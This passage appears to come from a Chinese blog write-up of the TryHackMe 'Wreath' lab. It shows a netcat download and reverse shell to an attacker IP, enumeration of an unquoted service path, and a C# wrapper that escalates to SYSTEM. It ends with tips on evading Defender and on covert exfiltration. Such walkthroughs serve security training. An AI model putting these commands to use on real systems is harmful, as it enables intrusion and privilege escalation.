+<p>现在，当我们运行“make”来构建二进制文件时，将使用正确的编译器来生成 x64 Windows 可执行文件。请注意，编译器会生成大量警告（为了便于阅读，以下屏幕截图中已将这些警告重定向到“/dev/null”，但是，您不需要这样做）。这些都无需担心；编译仍然应该成功。<br><img src="https://assets.tryhackme.com/additional/wreath-network/b29a99fd33fd.png" alt="Demonstrating the compilation process using the make command"></p>
+<p>编译完毕之后开启web服务器上传nc</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://10.50.216.34:8000/nc-mikann.exe -o c:\\windows\\temp\\nc-mikann.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe c:\\windows\\temp\\nc-mikann.exe 10.50.216.34 443 -e cmd.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Enumeration-4"><a href="#Enumeration-4" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>我们在第三个也是最后一个目标上获得了反向 shell——这是值得庆祝的事情！</p>
+<p>但是我们还没有对目标的完全系统访问权限。正如我们在第一次获得 webshell 时看到的那样，web 服务器（不幸）没有以系统权限运行（与 Xampp 默认设置相反），这使我们拥有一个低权限帐户。看来 Thomas 对自己 PC 上的安全性很在行！</p>
+<p>但是，这确实意味着我们需要枚举目标的权限向量——并且在 Defender 处于活动状态时，我们必须悄悄地进行。让我们考虑一下我们的选择：</p>
+<ul>
+<li>我们可以（也应该）始终从一点手动枚举开始。这将相对安静，并为我们提供了工作基准</li>
+<li>Defender <em>肯定</em> 会捕获 WinPEAS 的常规副本；但是，它不太可能捕获 <code>.bat</code> 版本或模糊的 <code>.exe</code> 版本，这两个版本都与常规版本一起发布在 <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/">PEAS 存储库</a> 中</li>
+<li>如果我们尝试加载任何 PowerShell 权限检查脚本（例如 PowerUp），AMSI 很可能会提醒 Defender，因此如果我们要使用它们，我们最好寻找这些脚本的模糊版本</li>
+</ul>
+<p>我们将从一些手动枚举开始，希望能找到一些可行的方法！</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\resources\uploads&gt;wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"</span><br><span class="line">DisplayName                                                                         Name                                      PathName                                                                                    StartMode  </span><br><span class="line">Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       </span><br><span class="line">Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       </span><br><span class="line">AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       </span><br><span class="line">LSM                                                                                 LSM                                                                                                                                   Unknown    </span><br><span class="line">Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     </span><br><span class="line">NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    </span><br><span class="line">Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     </span><br><span class="line">System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto</span><br></pre></td></tr></tbody></table></figure>
+
+<p>SystemExplorerHelpService服务的路径没有被引号包括</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\resources\uploads&gt;sc qc SystemExplorerHelpService</span><br><span class="line">sc qc SystemExplorerHelpService</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: SystemExplorerHelpService</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS </span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe</span><br><span class="line">        LOAD_ORDER_GROUP   : </span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Explorer Service</span><br><span class="line">        DEPENDENCIES       : </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现是LocalSystem身份运行的,并且发现这个路径我们拥有所有权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\resources\uploads&gt;powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"</span><br><span class="line">powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer</span><br><span class="line">Owner  : BUILTIN\Administrators</span><br><span class="line">Group  : WREATH-PC\None</span><br><span class="line">Access : BUILTIN\Users Allow  FullControl</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>让我们回顾一下我们在上一个任务中发现的内容：</p>
+<ul>
+<li>我们拥有一个特权，几乎可以肯定可以使用该特权升级到系统权限。缺点是我们需要混淆漏洞才能让它们绕过 Defender。</li>
+<li>我们有一个未加引号的服务路径漏洞，该漏洞针对以系统帐户运行的服务。这是理想的情况。</li>
+</ul>
+<p>我们有获取此框的 root 权限所需的一切。让我们开始吧！</p>
+<p>在两个立即可用的漏洞中，我们将通过未加引号的服务路径攻击进行工作，原因很简单：从中获取反向 shell <em>非常</em>容易 - 即使在 Defender 正在运行的情况下。我们发现的可用于操纵特权的漏洞需要经过自定义编译和混淆才能对我们有用；但是，使用不带引号的服务路径，我们只需要一个非常小的“包装器”程序来激活我们<em>已经在目标上拥有的</em> netcat 二进制文件。换句话说，我们只需要编写一个小型可执行文件来执行系统命令：激活 netcat 并以服务所有者（即本地系统）的身份向我们发送反向 shell。理想情况下，我们会编写一个完整的 C# 服务文件，该文件将与 Windows 服务管理系统无缝集成。虽然这是完全可能的（并且是迄今为止最好的选择），但为了简单起见，我们将坚持只创建一个独立的可执行文件。值得注意的是，这种技术可以有效地绕过目标上的防病毒软件；然而，在企业情况下，很有可能被入侵检测系统发现。在这种情况下，我们会寻找更复杂（如果类似）的解决方案。</p>
+<p>理想情况下，我们会在这里使用 Visual Studio。如果您碰巧有 Windows 主机并且熟悉 Visual Studio，那么请随意使用它。由于并非每个人都可以使用 Windows 机器（或愿意将 Windows 安装为虚拟机），因此教学内容将与 Linux 的 <code>mono</code> dotnet core 编译器配合使用。这可以轻松安装在 Kali 上，并允许我们编译可在 Windows 目标上运行的 C# 可执行文件。但是，如果在 Visual Studio 中编译，相同的代码也可以正常工作。</p>
+<hr>
+<p>首先我们需要安装 Mono。这可以通过以下方式完成：<br><code>sudo apt install mono-devel</code></p>
+<p>如果您使用的是 AttackBox，那么它应该已经安装了。</p>
+<p>现在，在您最喜欢的文本编辑器中打开一个名为 <code>Wrapper.cs</code> 的文件。</p>
+<p>我们需要做的第一件事是添加我们的“导入”。这允许我们使用来自其他“命名空间”的预定义代码——本质上让我们可以访问一些基本功能（例如输入/输出）。在文件的最顶部，添加以下几行：<br><code>using System;using System.Diagnostics;</code></p>
+<p>这些允许我们启动新进程（即执行 netcat）。</p>
+<p>接下来，我们需要为程序初始化命名空间和类：<br><code>namespace Wrapper{ class Program{ static void Main(){ //Our code will go here! } }}</code></p>
+<p>我们现在可以编写调用 netcat 的代码。这进入 <code>Main()</code> 函数（替换 <code>//Our code will go here!</code> 行）。</p>
+<p>首先，我们创建一个新进程，以及一个 ProcessStartInfo 对象来设置进程的参数：<br><code>Process proc = new Process();ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");</code></p>
+<p><em>确保将</em> <code>nc-USERNAME.exe</code><em>替换为您自己的 netcat 可执行文件的名称，并插入您自己的 IP 和端口！</em></p>
+<p>创建对象后，我们现在可以配置进程，使其在启动时不创建自己的 GUI 窗口：<br><code>procInfo.CreateNoWindow = true;</code></p>
+<p>最后，我们将 <code>ProcessStartInfo</code> 对象附加到进程，然后启动进程！<br><code>proc.StartInfo = procInfo;proc.Start();</code></p>
+<p>我们的程序现在已完成。它应该看起来像这样：<br><img src="https://assets.tryhackme.com/additional/wreath-network/1680d2c86ef0.png" alt="Screenshot of the full program with syntax highlighting"></p>
+<p>我们现在可以使用 Mono <code>mcs</code> 编译器来编译我们的程序。使用我们之前安装的包，这非常简单：<br><code>mcs Wrapper.cs</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/f051e39d81f6.png" alt="Demonstration of compiling with the mcs Wrapper.cs command"></p>
+<p>编写一个用于执行服务的执行文件Wrapper.cs</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace Wrapper{</span><br><span class="line">    class Program{</span><br><span class="line">        static void Main(){</span><br><span class="line">            Process proc = new Process();</span><br><span class="line">            ProcessStartInfo procInfo = new ProcessStartInfo("C:\\Users\\Thomas\\AppData\\Local\\Temp\nc-mikann.exe", "10.50.216.34 443 -e cmd.exe");</span><br><span class="line">            procInfo.CreateNoWindow = true;</span><br><span class="line">            proc.StartInfo = procInfo;</span><br><span class="line">            proc.Start();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>开启一个smb共享上传上去,nc也重新上传</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ smbserver.py share /tmp/smb/ -smb2support -username mikannse -password 1q2w3e!</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Users\Thomas\AppData\Local\Temp&gt;copy %Temp%\wrapper-mikann.exe "C:\Program Files (x86)\System Explorer\System.exe"</span><br><span class="line">copy %Temp%\wrapper-mikann.exe "C:\Program Files (x86)\System Explorer\System.exe"</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>复制成system.exe,然后kali开启监听</p>
+<h1 id="Exfiltration-Techniques-amp-Post-Exploitation"><a href="#Exfiltration-Techniques-amp-Post-Exploitation" class="headerlink" title="Exfiltration Techniques &amp; Post Exploitation"></a>Exfiltration Techniques &amp; Post Exploitation</h1><p>未经事先明确同意，绝不能考虑数据泄露。一般来说，大多数外部交战都会严格禁止从受感染的系统中获取数据；但是，值得注意的是，内部交战可能并非如此——一些外部交战直接为红队设定了目标，这些目标围绕着从受感染的目标中泄露一组数据。即使这项技能可能不会每天使用，但仍然值得学习。</p>
+<hr>
+<p>泄露的目标始终是从受感染的目标中删除数据。这可能是密码、密钥、客户/员工数据或其他任何有用或有价值的东西。如果被泄露的数据是纯文本，那么这可能就像将文件内容从远程 shell 复制并粘贴到本地文件一样简单。如果数据是二进制格式，或者不能直接复制和粘贴，则必须使用更复杂的方法来泄露目标文件。</p>
+<p>泄露数据的常用方法是使用无害的协议（通常是编码的）偷偷泄露数据。例如，DNS 通常用于（相对）悄悄地泄露数据。HTTPS 往往是一个不错的选择，因为在数据泄露之前，数据将被完全加密。ICMP 可用于（非常缓慢地）将数据从网络中获取。DNS-over-HTTPS 非常适合泄露数据，甚至电子邮件也经常使用。</p>
+<p>在现实世界中，攻击者会尽可能悄无声息地泄露数据，因为受感染的网络上可能存在活动的入侵检测系统，如果检测到数据，它会向网络管理员发出入侵警报。因此，攻击者不太可能使用像 FTP、TFTP、SMB 或 HTTP 这样简单的协议；然而，在不受监控的网络中，这些仍然是移动文件的不错选择。</p>
+<p>值得注意的是，大多数命令和控制 (C2) 框架都带有悄悄泄露数据的选项。从实际角度来说，这可能是恶意攻击者窃取数据的方式，因此有必要了解各种框架所使用的最新“标准”。还有许多独立工具可用于自动发送和接收混淆数据。</p>
+<hr>
+<p>简而言之，在窃取数据方面，唯一的限制就是您的想象力。虽然确实存在一些常用技术（以及许多可以利用这些技术的工具），但最成功的永远是那些新的和晦涩难懂的方法。谁知道呢？也许您甚至会找到隐写术的合法用途！</p>
+<p>作为额外的阅读材料，<a target="_blank" rel="noopener" href="https://www.pentestpartners.com/">PentestPartners</a> 有一篇关于此主题的精彩<a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/data-exfil-techniques/">博客文章</a>。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/08/23/THMWreath/">http://mikannse.space/2024/08/23/THMWreath/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/23/THMHolo/" title="THMHolo"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THMHolo</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/17/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%AC%E4%BA%94%E7%AB%A0/" title="玄机应急响应第五章"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">玄机应急响应第五章</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div><div><a href="/2024/03/14/ContainerVulnerabilitiesTHM/" title="ContainerVulnerabilitiesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">ContainerVulnerabilitiesTHM</div></div></a></div><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div><div><a href="/2023/10/24/HackingWordPressHTB/" title="HackingWordPressHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">HackingWordPressHTB</div></div></a></div><div><a href="/2024/04/02/IceTHM/" title="IceTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-02</div><div class="title">IceTHM</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Brief"><span class="toc-number">2.</span> <span class="toc-text">Brief</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-Pivoting"><span class="toc-number">5.</span> <span class="toc-text">What is Pivoting?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#High-level-Overview"><span class="toc-number">6.</span> <span class="toc-text">High-level Overview</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">7.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Proxychains-amp-Foxyproxy"><span class="toc-number">8.</span> <span class="toc-text">Proxychains &amp; Foxyproxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-Tunnelling-x2F-Port-Forwarding"><span class="toc-number">9.</span> <span class="toc-text">SSH Tunnelling &#x2F; Port Forwarding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#plink-exe"><span class="toc-number">10.</span> <span class="toc-text">plink.exe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socat"><span class="toc-number">11.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chisel"><span class="toc-number">12.</span> <span class="toc-text">Chisel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sshuttle"><span class="toc-number">13.</span> <span class="toc-text">sshuttle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">14.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration-2"><span class="toc-number">15.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pivoting"><span class="toc-number">16.</span> <span class="toc-text">Pivoting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Review"><span class="toc-number">17.</span> <span class="toc-text">Code Review</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation-1"><span class="toc-number">18.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stabilisation-amp-Post-Exploitation"><span class="toc-number">19.</span> <span class="toc-text">Stabilisation &amp; Post Exploitation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-1"><span class="toc-number">20.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Installation"><span class="toc-number">21.</span> <span class="toc-text">Empire: Installation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Overview"><span class="toc-number">22.</span> <span class="toc-text">Empire: Overview</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Listeners"><span class="toc-number">23.</span> <span class="toc-text">Empire: Listeners</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Stagers"><span class="toc-number">24.</span> <span class="toc-text">Empire: Stagers</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Agents"><span class="toc-number">25.</span> <span class="toc-text">Empire: Agents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Hop-Listeners"><span class="toc-number">26.</span> <span class="toc-text">Empire: Hop Listeners</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Git-Server"><span class="toc-number">27.</span> <span class="toc-text">Git Server</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Modules"><span class="toc-number">28.</span> <span class="toc-text">Empire: Modules</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire-Interactive-Shell"><span class="toc-number">29.</span> <span class="toc-text">Empire: Interactive Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion-1"><span class="toc-number">30.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration-3"><span class="toc-number">31.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pivoting-1"><span class="toc-number">32.</span> <span class="toc-text">Pivoting</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Wonders-of-Git"><span class="toc-number">33.</span> <span class="toc-text">The Wonders of Git</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Website-Code-Analysis"><span class="toc-number">34.</span> <span class="toc-text">Website Code Analysis</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit-PoC"><span class="toc-number">35.</span> <span class="toc-text">Exploit PoC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-2"><span class="toc-number">36.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AV-Detection-Methods"><span class="toc-number">37.</span> <span class="toc-text">AV Detection Methods</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Payload-Obfuscation"><span class="toc-number">38.</span> <span class="toc-text">PHP Payload Obfuscation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Compiling-Netcat-amp-Reverse-Shell"><span class="toc-number">39.</span> <span class="toc-text">Compiling Netcat &amp; Reverse Shell!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration-4"><span class="toc-number">40.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">41.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exfiltration-Techniques-amp-Post-Exploitation"><span class="toc-number">42.</span> <span class="toc-text">Exfiltration Techniques &amp; Post Exploitation</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/08/23/THMWreath/'
+    this.page.identifier = '/2024/08/23/THMWreath/'
+    this.page.title = 'THMWreath'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
